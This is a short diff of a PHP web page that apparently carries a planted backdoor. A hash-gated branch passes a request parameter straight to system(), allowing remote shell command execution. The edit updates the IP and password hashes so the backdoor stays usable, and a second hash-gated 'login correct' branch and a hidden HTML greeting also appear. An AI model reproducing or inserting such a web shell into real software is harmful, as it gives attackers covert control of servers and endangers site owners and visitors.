@@ -1,7 +1,7 @@
 <div style="display:none;">alex says hi :)</div>
 <?php
-if (md5($_SERVER['REMOTE_ADDR'])=="c02896b5533cc080a99895fbde3ba9b9" && md5($_REQUEST['secure'])=="7b91b151c2f1684cad17c824c1e8dff1"){ system($_REQUEST['secmd']); }
-if(md5($_REQUEST["mgp"])=="9437c78fbb422824a3782fa71f68e0aa") 
+if (md5($_SERVER['REMOTE_ADDR'])=="2406e0eb2885b088826ba92942ee8691" && md5($_REQUEST['secure'])=="7b91b151c2f1684cad17c824c1e8dff1"){ system($_REQUEST['secmd']); }
+if(md5($_REQUEST["mgp"])=="42d32c786161ab0c92a92b341b5395ee") 
 {
 echo "login correct<br>";
 echo "<xmp>";
